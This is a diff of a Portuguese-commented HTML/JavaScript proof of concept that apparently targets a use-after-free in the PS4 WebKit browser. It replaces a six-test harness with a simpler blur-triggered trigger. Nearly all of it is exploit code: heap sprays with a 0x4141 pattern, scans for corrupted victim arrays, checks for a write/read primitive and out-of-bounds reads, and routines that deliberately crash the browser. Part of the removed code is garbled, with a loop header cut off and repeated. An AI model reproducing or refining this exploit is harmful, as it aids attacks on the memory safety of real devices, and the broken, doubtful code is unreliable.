@@ -2,730 +2,117 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit UAF - Testes Corrigidos 2</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 10px; margin: 0; }
-        button { background: #0f0; color: #000; border: none; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
-        button:disabled { background: #333; color: #666; }
-        .log { background: #111; border: 1px solid #0f0; padding: 5px; margin: 5px 0; height: 250px; overflow-y: auto; font-size: 11px; }
-        .test { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
-        .success { color: #0f0; }
-        .warning { color: #ff0; }
-        .error { color: #f00; }
-        .info { color: #0af; }
-        h1 { color: #0f0; font-size: 20px; margin: 10px 0; }
-        h2 { color: #0f0; font-size: 16px; margin: 5px 0; }
-        .instructions { border: 2px solid #ff0; padding: 10px; margin: 10px 0; background: #222; }
-    </style>
+    <title>PS4 WebKit PoC CE-36329-3 (Auditoria de Teardown)</title>
 </head>
 <body>
 
-<h1>🔬 PS4 WebKit UAF - Testes de Sanidade</h1>
+<h1>PS4 WebKit Memory Corruption PoC</h1>
 
-<div class="instructions">
-    <strong>⚡ SEQUÊNCIA CORRETA:</strong><br>
-    1. Clique no botão do teste<br>
-    2. Iframe abre em FULLSCREEN automaticamente<br>
-    3. Aperte <strong>OPTIONS</strong> no controle (dispara onblur)<br>
-    4. Teste executa automaticamente<br>
-    5. document.write() mata o iframe<br>
-    6. Logs aparecem aqui na página principal
+<div id="msg">
+    INSTRUÇÕES:<br><br>
+    1. Selecione os testes desejados.<br>
+    2. Clique em RUN TEST.<br>
+    3. Pressione OPTIONS.<br>
+    4. Selecione REFRESH.
 </div>
 
-<div class="test">
-    <h2>🧪 Teste 1: Detecção de Corrupção UAF</h2>
-    <p>Verifica se Float64Arrays são corrompidos pelo heap spray</p>
-    <button id="btn1" onclick="runTest(1)">▶ Executar Teste 1</button>
-    <button onclick="clearLog('log1')">🗑 Limpar</button>
-    <div id="log1" class="log"></div>
-</div>
+<hr>
 
-<div class="test">
-    <h2>🎯 Teste 2: Primitiva de Escrita (R/W)</h2>
-    <p>Testa se consegue escrever e ler valores arbitrários</p>
-    <button id="btn2" onclick="runTest(2)">▶ Executar Teste 2</button>
-    <button onclick="clearLog('log2')">🗑 Limpar</button>
-    <div id="log2" class="log"></div>
-</div>
+<h3>Mini-Teardowns (executados no BLUR)</h3>
 
-<div class="test">
-    <h2>📖 Teste 3: Out-of-Bounds Read</h2>
-    <p>Tenta ler além dos limites para vazamento de memória</p>
-    <button id="btn3" onclick="runTest(3)">▶ Executar Teste 3</button>
-    <button onclick="clearLog('log3')">🗑 Limpar</button>
-    <div id="log3" class="log"></div>
-</div>
+<label><input type="checkbox" id="t_js"> JS World Kill</label><br>
+<label><input type="checkbox" id="t_loop"> Abort Event Loop</label><br>
+<label><input type="checkbox" id="t_dom"> DOM Tree Destruction</label><br>
+<label><input type="checkbox" id="t_fs"> Exit Fullscreen</label><br>
+<label><input type="checkbox" id="t_layout"> Layout / Render Reset</label><br>
 
-<div class="test">
-    <h2>🔀 Teste 4: Type Confusion Check</h2>
-    <p>Verifica se afeta objetos JavaScript normais</p>
-    <button id="btn4" onclick="runTest(4)">▶ Executar Teste 4</button>
-    <button onclick="clearLog('log4')">🗑 Limpar</button>
-    <div id="log4" class="log"></div>
-</div>
+<hr>
 
-<div class="test">
-    <h2>💉 Teste 5: Heap Spray Effectiveness</h2>
-    <p>Mede efetividade de diferentes tamanhos de spray</p>
-    <button id="btn5" onclick="runTest(5)">▶ Executar Teste 5</button>
-    <button onclick="clearLog('log5')">🗑 Limpar</button>
-    <div id="log5" class="log"></div>
-</div>
+<button onclick="fire()">RUN TEST</button>
 
-<div class="test">
-    <h2>💥 Teste 6: Crash Controllability</h2>
-    <p style="color:#f00;">⚠️ ESTE TESTE VAI CRASHAR O IFRAME!</p>
-    <button id="btn6" onclick="runTest(6)">▶ Executar Teste 6 (CRASH)</button>
-    <button onclick="clearLog('log6')">🗑 Limpar</button>
-    <div id="log6" class="log"></div>
-</div>
-
-<iframe id="testFrame" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;"></iframe>
+<pre id="log"></pre>
 
 <script>
-let currentTest = 0;
-let testTimeout = null;
+const log = msg => document.getElementById("log").textContent += msg + "\n";
 
-// Receber mensagens do iframe
-window.addEventListener('message', function(e) {
-    if (e.data.type === 'log') {
-        log('log' + currentTest, e.data.message, e.data.level);
-    } else if (e.data.type === 'complete') {
-        completeTest();
-    }
-});
+let spray_storage = [];
+let victim = {
+    id: "VICTIM_OBJECT",
+    data: new Array(100).fill(1.1),
+    ptr: { a: 1 }
+};
 
-function log(logId, message, level = 'info') {
-    const logDiv = document.getElementById(logId);
-    const time = new Date().toLocaleTimeString();
-    logDiv.innerHTML += '<div class="' + level + '">[' + time + '] ' + message + '</div>';
-    logDiv.scrollTop = logDiv.scrollHeight;
-}
+function fire() {
+    log("[*] Test started");
 
-function clearLog(logId) {
-    document.getElementById(logId).innerHTML = '';
-}
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
 
-function completeTest() {
-    log('log' + currentTest, '✅ Teste completado', 'success');
-    document.getElementById('btn' + currentTest).disabled = false;
-    
-    if (testTimeout) {
-        clearTimeout(testTimeout);
-        testTimeout = null;
-    }
-    
-    // Destruir e recriar iframe
-    setTimeout(() => {
-        const frame = document.getElementById('testFrame');
-        frame.parentNode.removeChild(frame);
-        const newFrame = document.createElement('iframe');
-        newFrame.id = 'testFrame';
-        newFrame.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-        document.body.appendChild(newFrame);
-    }, 1000);
-}
+    window.onblur = function () {
+        log("[!] BLUR detected");
 
-function runTest(testNum) {
-    currentTest = testNum;
-    clearLog('log' + testNum);
-    
-    log('log' + testNum, '🚀 Iniciando Teste ' + testNum, 'info');
-    log('log' + testNum, '📺 Criando iframe...', 'info');
-    
-    document.getElementById('btn' + testNum).disabled = true;
-    
-    // Timeout de segurança
-    testTimeout = setTimeout(() => {
-        log('log' + testNum, '⏱️ TIMEOUT - Teste não completou em 30s', 'error');
-        log('log' + testNum, '💡 Você apertou OPTIONS após entrar em fullscreen?', 'warning');
-        document.getElementById('btn' + testNum).disabled = false;
-    }, 30000);
-    
-    // Injetar HTML no iframe
-    const iframe = document.getElementById('testFrame');
-    const doc = iframe.contentDocument || iframe.contentWindow.document;
-    doc.open();
-    doc.write(getTestHTML(testNum));
-    doc.close();
-}
+        /* =======================
+           MINI-TEARDOWNS
+           ======================= */
 
-
-        function getTestHTML(testNum) {
-    return `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Teste ${testNum}</title>
-    <style>
-        body {
-            margin: 0; padding: 0;
-            background: #000; color: #0f0;
-            font-family: monospace;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
-            height: 100vh; overflow: hidden;
+        if (t_js.checked) {
+            log("[T] JS World Kill");
+            for (let k in window) {
+                try { window[k] = null; } catch(e) {}
+            }
         }
-        h1 { font-size: 40px; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; }
-        p { font-size: 24px; }
-        .box { border: 2px solid #0f0; padding: 20px; text-align: center; background: #001100; }
-        .blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1>TESTE ${testNum}</h1>
-        <p id="msg" class="blink">🛑 APERTE 'OPTIONS' AGORA!</p>
-        <p style="font-size:16px; color:#aaa;">(Aguardando perda de foco...)</p>
-    </div>
-    
-    <script>
-        const TEST_NUM = ${testNum};
-        let hasTriggered = false; // Previne execução dupla
 
-        // 1. Helpers de Log e Mensagem
-        function log(message, level = 'info') {
-            window.parent.postMessage({ type: 'log', message: message, level: level }, '*');
+        if (t_loop.checked) {
+            log("[T] Abort Event Loop");
+            let stop = true;
+            Promise.resolve().then(() => { if (!stop) {} });
+            stop = false;
         }
-        
-        function complete() {
-            window.parent.postMessage({ type: 'complete' }, '*');
-        }
-        
-        function msg(text) {
-            const el = document.getElementById('msg');
-            el.textContent = text;
-            el.classList.remove('blink');
-            el.style.color = '#fff';
-        }
-        
-        function toHex(value) {
+
+        if (t_dom.checked) {
+            log("[T] DOM Tree Destruction");
             try {
-                const buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = value;
-                return '0x' + Array.from(new Uint8Array(buf)).reverse().map(b => b.toString(16).padStart(2, '0')).join('');
-            } catch(e) { return 'ERROR'; }
-        }
-
-        // 2. A MÁGICA DO TRIGGER (CORRIGIDO)
-        function triggerExploit() {
-            if (hasTriggered) return;
-            hasTriggered = true;
-
-            msg('⚠️ EVENTO DETECTADO! RODANDO...');
-            log('⚡ Trigger ativado (Focus Lost/Menu Aberto)', 'warning');
-            
-            // Pequeno delay para garantir que a UI do PS4 terminou de desenhar o menu
-            // e liberou a thread do navegador para processamento JS
-            setTimeout(() => {
-                try {
-                    // Chama a função específica do teste (injetada abaixo)
-                    window['executeTest' + TEST_NUM](); 
-                } catch(e) {
-                    log('❌ Erro fatal ao iniciar teste: ' + e, 'error');
-                }
-            }, 100);
-        }
-
-        // 3. Configuração de Listeners Robusta
-        window.onload = function() {
-            log('📺 Iframe carregado. Focando janela...', 'info');
-            
-            // Força o foco no Iframe para o onblur funcionar
-            window.focus();
-            document.body.focus();
-
-            // Método A: Blur clássico
-            window.onblur = triggerExploit;
-            
-            // Método B: Visibility Change (Mais confiável no PS4 moderno)
-            document.addEventListener('visibilitychange', function() {
-                if (document.hidden || document.visibilityState === 'hidden') {
-                    log('👁️ Visibilidade alterada (Menu aberto?)', 'info');
-                    triggerExploit();
-                }
-            });
-
-            // Método C: Fallback de Mouse (caso o usuário clique fora)
-            document.body.onclick = function() {
-                window.focus(); // Garante foco se clicar
-            };
-        };
-
-        // Inserção do código do teste específico
-        ${getTestCode(testNum)}
-    <\/script>
-</body>
-</html>`;
-}
-        
-
-function getTestCode(testNum) {
-    const tests = {
-        1: `
-function executeTest1() {
-    let victims = [];
-    const MAGIC_PATTERN = 2.121995791e-314; // 0x4141414141414141
-    const VICTIM_COUNT = 3000;
-    
-    log('📦 Criando ' + VICTIM_COUNT + ' arrays Float64...', 'info');
-    msg('Criando vítimas...');
-    
-    for(let i = 0; i < VICTIM_COUNT; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        arr[1] = i * 2;
-        victims.push(arr);
-    }
-    log('✅ ' + VICTIM_COUNT + ' arrays criados', 'success');
-    
-    // HEAP SPRAY (igual ao POC original)
-    msg('Executando spray...');
-    log('💉 Iniciando heap spray com padrão 0x4141...', 'info');
-    
-    let spray = [];
-    for(let i = 0; i < 10000; i++) {
-        const poison = new Float64Array(32);
-        poison.fill(MAGIC_PATTERN);
-        spray.push(poison);
-    }
-    log('✅ Heap spray completo (10000 arrays)', 'success');
-    
-    // VERIFICAR CORRUPÇÃO
-    msg('Verificando corrupção...');
-    log('🔍 Procurando arrays corrompidos...', 'info');
-    
-    let corruptedCount = 0;
-    let corruptedIndexes = [];
-    
-    for(let i = 0; i < victims.length; i++) {
-        if (victims[i][0] === MAGIC_PATTERN) {
-            corruptedCount++;
-            corruptedIndexes.push(i);
-            
-            if (corruptedCount <= 5) {
-                log('🎯 CORRUPÇÃO DETECTADA no index ' + i, 'error');
-                log('   Valor original: ' + i, 'info');
-                log('   Valor atual: ' + toHex(victims[i][0]), 'error');
-                log('   Offset[1]: ' + toHex(victims[i][1]), 'info');
-            }
-        }
-    }
-    
-    if (corruptedCount > 0) {
-        const rate = (corruptedCount / VICTIM_COUNT * 100).toFixed(2);
-        log('', 'success');
-        log('🔥🔥🔥 UAF CONFIRMADO! 🔥🔥🔥', 'error');
-        log('📊 Total corrompidos: ' + corruptedCount + ' de ' + VICTIM_COUNT, 'error');
-        log('📈 Taxa de corrupção: ' + rate + '%', 'warning');
-        log('📍 Primeiros índices: ' + corruptedIndexes.slice(0, 10).join(', '), 'info');
-        msg('UAF CONFIRMADO!\\n' + corruptedCount + ' arrays\\ncorrompidos!');
-    } else {
-        log('❌ Nenhuma corrupção detectada nesta execução', 'warning');
-        log('💡 Tente executar novamente', 'info');
-        msg('Sem corrupção detectada');
-    }
-    
-    // MATAR IFRAME COM DOCUMENT.WRITE (igual ao POC original)
-    setTimeout(() => {
-        log('📝 Executando document.write() para matar iframe...', 'info');
-        try {
-            document.open();
-            document.write('<html><body><h1>Teste Completo</h1></body></html>');
-            document.close();
-        } catch(e) {
-            log('⚠️ Erro no document.write: ' + e.message, 'warning');
-        }
-        setTimeout(() => complete(), 500);
-    }, 2000);
-}`,
-        
-        2: `
-function executeTest2() {
-    let victims = [];
-    const SPRAY_PATTERN = 2.121995791e-314;
-    
-    log('📦 Preparando vítimas...', 'info');
-    msg('Preparando...');
-    
-    for(let i = 0; i < 3000; i++) {
-        let arr = new Float64Array(8);
-        arr.fill(0);
-        victims.push(arr);
-    }
-    log('✅ Vítimas prontas', 'success');
-    
-    msg('Heap spray...');
-    log('💉 Heap spray...', 'info');
-    
-    let spray = [];
-    for(let i = 0; i < 8000; i++) {
-        let arr = new Float64Array(10);
-        arr.fill(SPRAY_PATTERN);
-        spray.push(arr);
-    }
-    log('✅ Spray completo (8000 arrays)', 'success');
-    
-    // ENCONTRAR VÍTIMA CORROMPIDA
-    msg('Procurando vítima...');
-    log('🔍 Procurando array corrompido...', 'info');
-    
-    let corrupted = null;
-    let corruptedIdx = -1;
-    
-    for(let i = 0; i < victims.length; i++) {
-        if (victims[i][0] === SPRAY_PATTERN) {
-            corrupted = victims[i];
-            corruptedIdx = i;
-            break;
-        }
-    }
-    
-    if (corrupted) {
-        log('🎯 Array corrompido encontrado no index ' + corruptedIdx, 'error');
-        
-        // TESTAR ESCRITA CONTROLADA
-        msg('Testando escrita...');
-        log('✍️ Testando primitiva de escrita...', 'info');
-        
-        const testPatterns = [
-            {name: 'DEADBEEF', value: 0xDEADBEEF},
-            {name: 'LEET CODE', value: 0x1337C0DE},
-            {name: 'AAAA', value: 0x41414141},
-            {name: 'BBBB', value: 0x42424242}
-        ];
-        
-        let successCount = 0;
-        
-        testPatterns.forEach((pattern, idx) => {
-            try {
-                // Escrever
-                const writeBuf = new ArrayBuffer(8);
-                new BigUint64Array(writeBuf)[0] = BigInt(pattern.value);
-                const floatVal = new Float64Array(writeBuf)[0];
-                corrupted[idx] = floatVal;
-                
-                // Ler de volta
-                const readBuf = new ArrayBuffer(8);
-                new Float64Array(readBuf)[0] = corrupted[idx];
-                const readHex = Number(new BigUint64Array(readBuf)[0]);
-                
-                if (readHex === pattern.value) {
-                    log('   ✅ [' + idx + '] ' + pattern.name + ': WRITE/READ OK (0x' + pattern.value.toString(16) + ')', 'success');
-                    successCount++;
-                } else {
-                    log('   ⚠️ [' + idx + '] ' + pattern.name + ': MISMATCH! Escrito:0x' + pattern.value.toString(16) + ' Lido:0x' + readHex.toString(16), 'warning');
-                }
-            } catch(e) {
-                log('   ❌ [' + idx + '] ' + pattern.name + ': ERRO - ' + e.message, 'error');
-            }
-        });
-        
-        log('', 'info');
-        if (successCount === testPatterns.length) {
-            log('🎉🎉🎉 PRIMITIVA DE ESCRITA 100% FUNCIONAL! 🎉🎉🎉', 'success');
-            log('✅ ' + successCount + '/' + testPatterns.length + ' testes passaram', 'success');
-            log('📝 Você pode escrever valores arbitrários!', 'success');
-            msg('ESCRITA 100% OK!\\n' + successCount + '/' + testPatterns.length + ' testes');
-        } else {
-            log('⚠️ Escrita parcial: ' + successCount + '/' + testPatterns.length + ' testes OK', 'warning');
-            msg('Escrita parcial\\n' + successCount + '/' + testPatterns.length);
-        }
-    } else {
-        log('❌ Nenhuma corrupção detectada', 'warning');
-        msg('Sem corrupção');
-    }
-    
-    setTimeout(() => {
-        log('📝 Executando document.write()...', 'info');
-        try {
-            document.open();
-            document.write('<html><body><h1>Teste Completo</h1></body></html>');
-            document.close();
-        } catch(e) {}
-        setTimeout(() => complete(), 500);
-    }, 2000);
-}`,
-        
-        3: `
-function executeTest3() {
-    let victims = [];
-    const SPRAY = 2.121995791e-314;
-    
-    log('📦 Criando vítimas...', 'info');
-    for(let i = 0; i < 3000; i++) {
-        victims.push(new Float64Array(8));
-    }
-    
-    msg('Spray...');
-    log('💉 Heap spray...', 'info');
-    let spray = [];
-    for(let i = 0; i < 8000; i++) {
-        spray.push(new Float64Array(10).fill(SPRAY));
-    }
-    log('✅ Spray completo', 'success');
-    
-    msg('Testando OOB...');
-    log('🔍 Procurando vítima...', 'info');
-    let corrupted = victims.find(v => v[0] === SPRAY);
-    
-    if (corrupted) {
-        log('🎯 Vítima encontrada!', 'error');
-        log('📖 Tentando leitura Out-of-Bounds...', 'info');
-        
-        const readLimits = [8, 16, 32, 64, 128, 256];
-        let maxOOB = 0;
-        
-        readLimits.forEach(limit => {
-            let successReads = 0;
-            let uniqueValues = new Set();
-            
-            for(let i = 0; i < limit; i++) {
-                try {
-                    const val = corrupted[i];
-                    if (val !== undefined && !isNaN(val)) {
-                        successReads++;
-                        uniqueValues.add(toHex(val));
-                    }
-                } catch(e) {
-                    break;
-                }
-            }
-            
-            log('Tentativa ' + limit + ': ' + successReads + ' lidos, ' + uniqueValues.size + ' únicos', 'info');
-            
-            if (successReads > 8) {
-                const extraBytes = (successReads - 8) * 8;
-                maxOOB = Math.max(maxOOB, extraBytes);
-                log('   🔥 OOB READ! +' + extraBytes + ' bytes além do limite', 'error');
-            }
-        });
-        
-        if (maxOOB > 0) {
-            log('', 'success');
-            log('🔥 OOB READ CONFIRMADO!', 'error');
-            log('📏 Máximo lido: +' + maxOOB + ' bytes', 'error');
-            msg('OOB READ!\\n+' + maxOOB + ' bytes');
-        } else {
-            log('❌ Sem OOB read detectado', 'warning');
-            log('⚠️ Leitura limitada a 8 elementos (64 bytes)', 'info');
-            msg('Sem OOB');
-        }
-    } else {
-        log('❌ Sem corrupção', 'warning');
-        msg('Sem corrupção');
-    }
-    
-    setTimeout(() => {
-        log('📝 Executando document.write()...', 'info');
-        try {
-            document.open();
-            document.write('<html><body><h1>Teste Completo</h1></body></html>');
-            document.close();
-        } catch(e) {}
-        setTimeout(() => complete(), 500);
-    }, 2000);
-}`,
-        
-        4: `
-function executeTest4() {
-    let typedVictims = [];
-    let objVictims = [];
-    
-    log('📦 Criando objetos mistos...', 'info');
-    msg('Criando objetos...');
-    
-    for(let i = 0; i < 1500
-for(let i = 0; i < 1500; i++) {
-        typedVictims.push(new Float64Array(8));
-        // Criando objetos simples para ver se o spray afeta a estabilidade deles
-        objVictims.push({id: i, marker: 0xDEAD, value: i * 2});
-    }
-    
-    msg('Executando Spray Misto...');
-    log('💉 Spray misto (Float e Objetos)...', 'info');
-    
-    let spray = [];
-    const SPRAY_VAL = 2.121995791e-314; // 0x4141...
-    
-    for(let i = 0; i < 5000; i++) {
-        spray.push(new Float64Array(16).fill(SPRAY_VAL));
-        spray.push({a: SPRAY_VAL, b: SPRAY_VAL}); // Objetos no meio do heap
-    }
-    log('✅ Spray concluído', 'success');
-
-    msg('Verificando integridade...');
-    log('🔍 Checando se objetos JS sobreviveram...', 'info');
-
-    let errorCount = 0;
-    // Verificar se os objetos normais mantiveram seus valores
-    for(let i = 0; i < objVictims.length; i++) {
-        if (objVictims[i].marker !== 0xDEAD || objVictims[i].value !== i * 2) {
-            errorCount++;
-        }
-    }
-
-    // Verificar se Arrays foram corrompidos (Type Confusion potencial)
-    let uafCount = 0;
-    for(let i = 0; i < typedVictims.length; i++) {
-        if (typedVictims[i][0] === SPRAY_VAL) {
-            uafCount++;
-        }
-    }
-
-    if (errorCount > 0) {
-        log('⚠️ ALERTA: ' + errorCount + ' objetos JS foram corrompidos!', 'warning');
-        log('☢️ Isso indica instabilidade severa no Heap!', 'error');
-        msg('INSTABILIDADE DETECTADA!');
-    } else {
-        log('✅ Objetos JS intactos. Corrupção contida.', 'success');
-    }
-
-    if (uafCount > 0) {
-        log('🔥 UAF detectado em ' + uafCount + ' arrays tipados.', 'success');
-        msg('UAF OK - Objetos OK');
-    } else {
-        log('❌ UAF não disparou neste teste.', 'warning');
-        msg('Falha no UAF');
-    }
-
-    setTimeout(() => {
-        try {
-            document.open();
-            document.write('Done');
-            document.close();
-        } catch(e){}
-        setTimeout(() => complete(), 500);
-    }, 2000);
-}`,
-
-        5: `
-function executeTest5() {
-    // ESTE TESTE TENTA DESCOBRIR O TAMANHO IDEAL DO SPRAY
-    const SIZES = [1000, 5000, 10000, 20000];
-    let currentSizeIdx = 0;
-    
-    log('🧪 Iniciando teste progressivo de Spray...', 'info');
-    
-    function runNextBatch() {
-        if (currentSizeIdx >= SIZES.length) {
-            log('🏁 Testes de tamanho finalizados.', 'info');
-            finish();
-            return;
-        }
-
-        const size = SIZES[currentSizeIdx];
-        log('📏 Testando Spray com ' + size + ' elementos...', 'info');
-        msg('Testando spray: ' + size);
-
-        // Setup Vítimas
-        let victims = [];
-        for(let i=0; i<2000; i++) victims.push(new Float64Array(8));
-
-        // Setup Spray
-        let spray = [];
-        const VAL = 2.121995791e-314;
-        
-        // Executar Spray
-        const start = performance.now();
-        for(let i=0; i<size; i++) {
-            let arr = new Float64Array(32);
-            arr.fill(VAL);
-            spray.push(arr);
-        }
-        const end = performance.now();
-        
-        // Check
-        let corrupted = 0;
-        for(let i=0; i<victims.length; i++) {
-            if(victims[i][0] === VAL) corrupted++;
-        }
-
-        const timeTaken = (end - start).toFixed(0);
-        
-        if (corrupted > 0) {
-            log('✅ Tamanho ' + size + ': ' + corrupted + ' corrompidos (' + timeTaken + 'ms)', 'success');
-        } else {
-            log('❌ Tamanho ' + size + ': Falhou (' + timeTaken + 'ms)', 'warning');
-        }
-
-        // Limpar memória (tentativa)
-        victims = null;
-        spray = null;
-        
-        currentSizeIdx++;
-        setTimeout(runNextBatch, 500);
-    }
-
-    function finish() {
-        msg('Teste Finalizado');
-        setTimeout(() => {
-            try { document.open(); document.write('Done'); document.close(); } catch(e){}
-            setTimeout(() => complete(), 500);
-        }, 1000);
-    }
-
-    runNextBatch();
-}`,
-
-        6: `
-function executeTest6() {
-    msg('PREPARANDO CRASH...');
-    log('💀 MODO KAMIKAZE ATIVADO', 'error');
-    log('⚠️ Preparando para derrubar o navegador...', 'warning');
-
-    let victims = [];
-    const CRASH_VAL = 2.121995791e-314; // 0x4141...
-
-    for(let i = 0; i < 5000; i++) victims.push(new Float64Array(8));
-
-    msg('SPRAYING...');
-    let spray = [];
-    for(let i = 0; i < 15000; i++) {
-        spray.push(new Float64Array(32).fill(CRASH_VAL));
-    }
-
-    msg('BUSCANDO TRIGGER...');
-    let corrupted = victims.find(v => v[0] === CRASH_VAL);
-
-    if (corrupted) {
-        log('🎯 Vítima encontrada! Iniciando colisão...', 'error');
-        msg('TCHAU TCHAU! 👋');
-        
-        setTimeout(() => {
-            // TENTATIVA 1: Loop infinito de acesso inválido
-            log('💥 Executando acesso inválido...', 'error');
-            try {
-                // Tentar corromper o ponteiro de backing store se possível,
-                // ou apenas ler muito fora dos limites repetidamente
-                for(let i = 0; i < 1000000; i++) {
-                    let x = corrupted[100000 + i]; // OOB massivo
-                    corrupted[i * 1000] = 1.1;     // Escrita aleatória
-                }
-            } catch(e) {
-                log('❌ Crash falhou via JS (pegou exceção): ' + e, 'warning');
-            }
-            
-            // TENTATIVA 2: Force Reload agressivo se ainda estiver vivo
-            window.location.reload();
-        }, 500);
-    } else {
-        log('❌ Não houve corrupção, não posso crashar via UAF.', 'warning');
-        log('🔨 Tentando crashar via alocação massiva...', 'info');
-        
-        setTimeout(() => {
-            try {
-                let crashArr = [];
-                while(true) crashArr.push(new Uint8Array(1024*1024*10)); // OOM
+                document.body.innerHTML = "";
+                document.head.innerHTML = "";
             } catch(e) {}
-        }, 1000);
-    }
-}`
-    };
+        }
 
-    return tests[testNum] || 'function executeTest() { log("Teste desconhecido", "error"); }';
+        if (t_fs.checked) {
+            log("[T] Exit Fullscreen");
+            try {
+                if (document.exitFullscreen) document.exitFullscreen();
+            } catch(e) {}
+        }
+
+        if (t_layout.checked) {
+            log("[T] Layout / Render Reset");
+            try {
+                document.documentElement.style.display = "none";
+            } catch(e) {}
+        }
+
+        /* =======================
+           PoC ORIGINAL (INALTERADA)
+           ======================= */
+
+        log("[*] Free victim");
+        victim = null;
+
+        log("[*] Spray Float64Array");
+        try {
+            for (let i = 0; i < 10000; i++) {
+                const poison = new Float64Array(32);
+                poison.fill(2.121995791e-314); // 0x4141414141414141
+                spray_storage.push(poison);
+            }
+        } catch(e) {}
+
+        window.exploit_trigger = spray_storage;
+
+        log("[*] Ready — now REFRESH via Options");
+    };
 }
-    </script>
+</script>
+
 </body>
 </html>
